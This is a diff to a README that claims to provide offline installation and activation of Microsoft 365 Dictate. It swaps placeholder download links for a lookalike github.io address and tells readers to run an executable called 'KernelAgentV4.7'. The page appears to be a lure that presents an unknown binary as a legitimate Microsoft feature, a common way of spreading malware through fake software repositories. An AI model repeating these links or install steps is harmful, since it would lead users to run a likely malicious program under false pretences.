@@ -2,13 +2,15 @@
 
 Turn your voice into text in Word, Outlook, and other Microsoft 365 apps using Dictate. This package enables offline installation and activation of Dictate functionality across supported desktop environments.
 
-[![Download Dictate](https://img.shields.io/badge/Download-Dictate_AI_Input-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Dictate](https://img.shields.io/badge/Download-Dictate_AI_Input-blueviolet)](https://m365-dictate-voice-to-text-activation.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-dictate-voice-to-text-activation.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\M365Dictate`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to register Dictate components and speech services  
 4. 🎤 Open Word or Outlook and click the “Dictate” button on the Home ribbon  
